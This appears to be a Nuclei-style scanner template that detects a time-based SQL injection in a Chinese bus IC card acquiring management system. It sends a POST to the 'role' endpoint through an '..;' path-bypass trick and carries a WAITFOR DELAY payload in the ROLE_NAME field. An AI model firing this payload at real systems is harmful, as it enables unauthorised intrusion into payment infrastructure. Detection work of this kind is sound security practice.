id: poc-yaml-bus-ic-card-ams-role-sqli
info:
  name: 公交IC卡收单管理系统 role SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection

variables:
  t1: "{{rand_int(1,5)}}"
  t2: "{{to_number(t1) * 2}}"
  t3: "{{to_number(t2) + 2}}"

http:
  - method: POST
    path:
      - "{{BaseURL}}/assets/..;/role"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: |-
      _search=false&nd=1727245571646&rowCountPerPage=10&pageNo=1&sidx=ROLE_NAME&sord=asc&method=select&ROLE_NAME=1');WAITFOR DELAY '0:0:{{t1}}'--
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "window.top.window.jQuery"
          - "(\"#temporary_iframe_id\")"
          - "超级管理员"
        condition: and
      - type: dsl
        dsl:
          - "duration >= to_number(t2)"
          - "duration <= to_number(t3)"
